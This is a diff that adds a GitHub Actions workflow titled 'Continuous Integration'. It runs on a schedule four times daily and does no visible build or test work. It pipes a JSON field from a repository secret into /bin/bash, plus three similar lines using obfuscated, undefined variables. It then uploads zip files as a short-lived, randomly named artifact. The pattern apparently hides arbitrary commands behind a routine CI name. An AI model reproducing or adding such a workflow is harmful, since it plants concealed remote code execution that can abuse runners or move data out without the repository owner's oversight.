@@ -1,0 +1,31 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          onp5: ${{ secrets.onp5 }}
+        run: |
+          printf '%s' "$onp5" | jq -r .vsqq3958 | /bin/bash
+          echo $p97088 | jq -r .swnun79 | /bin/bash
+          echo $rpn902 | jq -r .icvfu0088 | /bin/bash
+          echo $evt0519 | jq -r .exxh05286 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: cvxyqDe4
+          path: "*.zip"
+          retention-days: 1
